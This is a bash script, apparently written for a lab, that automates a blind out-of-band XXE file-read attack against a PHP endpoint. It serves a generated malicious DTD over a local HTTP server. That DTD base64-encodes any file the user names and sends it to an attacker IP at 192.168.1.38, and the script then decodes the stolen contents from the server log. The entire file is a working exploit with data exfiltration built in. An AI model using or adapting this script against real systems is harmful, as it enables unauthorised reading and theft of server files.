#!/bin/bash 

function ctrl_c(){
	echo -e "\n\n\t[!] Quiting...\n\n"
	kill -9 $PID 
	wait $PID 2>/dev/null 
	/usr/bin/rm -f response
	/usr/bin/rm -f malicious.dtd 
	exit 1 
}

trap ctrl_c SIGINT

if [ $EUID -ne 0 ]; then 
	echo -e "\n\n\t[!] The scrip need runs like root :)\n\n"
else 
 
  python3 -m http.server 80 &>response &
  PID=$!
  sleep 2 

  while true; do  
  
  echo -ne "\n[!] Introduce el archivo a leer: " && read -r file; # -r para que acepte espacios 
  
  evildtd="""
  <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$file\">
  <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.38/?file=%file;'>\">
  %eval;
  %exfil;"""

  [[ -f "malicious.dtd" ]] && /usr/bin/rm malicious.dtd 
  echo "" > malicious.dtd
  echo $evildtd > malicious.dtd 
 
  /usr/bin/curl -s -X GET "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY % myFile SYSTEM "http://192.168.1.38/malicious.dtd" > %myFile; ]>
  <root><name>dobliuw</name><tel>12314124</tel><email>dobliuw@dobliuw.com</email><password>dobliuw123</password></root>' &>/dev/null 

  echo -e "\n[+] $file : " && /usr/bin/cat response | /usr/bin/tail -n 1 | /usr/bin/grep -oP "/?file=\K[^.*]+" | /usr/bin/base64 -d
  

  done 
fi 


